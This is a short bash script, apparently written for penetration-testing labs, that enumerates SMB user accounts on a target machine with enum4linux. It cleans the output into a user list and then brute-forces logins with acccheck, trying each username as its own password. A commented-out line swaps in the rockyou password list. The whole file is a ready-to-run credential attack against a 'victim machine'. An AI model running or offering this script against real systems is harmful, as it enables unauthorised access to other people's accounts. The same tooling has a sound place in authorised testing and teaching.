#!/bin/bash
#This is a simple script to enumerate user accounts via enum4linux
#replace target with your victim machine
#grep the output from enum4linux for a clean user list
#Simple Acccheck against the variable target using the user list and user list as the password

#Basic script to check to see if the username is the password account

target=10.0.2.5

mkdir $target
cd $target


echo Starting Enum4linux scan..
echo Creating enum4_users.txt..
enum4linux -U $target > enum4_users.txt

echo Cleaning up the Enum4Linux output..
echo Creating users.txt..
cat enum4_users.txt | grep Account: | cut -d':' -f5 | sed 's/Name//g' | sed '/^$/d;s/[[:blank:]]//g' | sort  > users.txt

echo Starting acccheck..
acccheck -t $target -U users.txt -P users.txt

echo "If no accounts are successful try using rock you wordlist for the password. Remove the comment in the script."
#acccheck -t $target -U users.txt -P /usr/share/wordlists/rockyou.txt 